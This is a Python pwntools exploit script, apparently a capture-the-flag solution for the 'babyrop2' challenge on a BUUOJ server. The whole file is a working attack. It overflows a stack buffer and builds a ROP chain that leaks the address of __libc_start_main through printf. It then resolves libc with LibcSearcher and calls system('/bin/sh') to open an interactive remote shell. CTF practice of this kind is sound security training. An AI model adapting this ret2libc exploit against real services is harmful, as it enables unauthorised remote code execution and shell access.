#!/usr/bin/python3
from pwn import *
from LibcSearcher import LibcSearcher
#r = process("./pwn")
r = remote("node5.buuoj.cn",25389)

e = ELF("./babyrop2")
libc = ELF("./libc.so.6")
context(log_level = 'debug')

printf_plt_addr = e.plt["printf"]
lsm_got = e.got["__libc_start_main"]
main_addr = e.symbols["main"]
format_addr = 0x0000000000400770
rdi_ret_addr = 0x0000000000400733
rsi_r15_ret_addr = 0x0000000000400731

offset = 0x20 + 8
payload1 = offset*b'a' + p64(rdi_ret_addr) + p64(format_addr) + p64(rsi_r15_ret_addr) + p64(lsm_got) + p64(1) + p64(printf_plt_addr) + p64(main_addr)
r.recvuntil("What's your name? ")
r.sendline(payload1)

lsm_addr = u64(r.recvuntil("\x7f")[-6:].ljust(8,b'\x00'))
print(hex(lsm_addr))
#pause()

libc = LibcSearcher('__libc_start_main',lsm_addr)
libcbase = lsm_addr - libc.dump('__libc_start_main')
system_addr = libcbase + libc.dump('system')
binsh_addr = libcbase + libc.dump('str_bin_sh')
'''
base_addr = lsm_addr - libc.symbols["__libc_start_main"]
system_addr = base_addr + libc.symbols["system"]
binsh_addr = base_addr + next(libc.search(b"/bin/sh"))
'''

payload2 = offset*b'a' + p64(rdi_ret_addr) + p64(binsh_addr) + p64(system_addr) + p64(1)
r.recvuntil("What's your name? ")
r.sendline(payload2)

#r.sendline("cat flag")
r.interactive()



